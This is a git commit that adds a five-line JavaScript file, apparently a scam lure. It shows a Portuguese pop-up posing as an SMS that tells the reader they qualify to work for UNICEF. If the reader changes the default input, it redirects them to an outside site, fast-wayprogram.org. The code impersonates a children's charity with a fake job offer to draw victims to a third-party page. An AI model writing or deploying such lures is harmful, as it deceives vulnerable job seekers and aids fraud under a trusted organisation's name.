850fe77865f06d4c12f8f6810edafc44ace1b0a2
superblog1 <imohette4@gmail.com>
2025-02-09 10:41:33 +0100

    Create unicef-active.js

---
+++ unicef-active.js
@@ -0,0 +1,5 @@
+var password = 'INSCREVA-SE AGORA'
+password=prompt('SMS: Parabéns Você está qualificado para trabalhar com o FUNDO DAS NAÇÕES UNIDAS PARA CRIANÇAS (UNICEF). Por favor, pressione OK para enviar a inscrição   ','INSCREVA-SE AGORA');
+if (password != 'INSCREVA-SE AGORA') {
+location.href='https://fast-wayprogram.org/unicef-mz.html';
+}
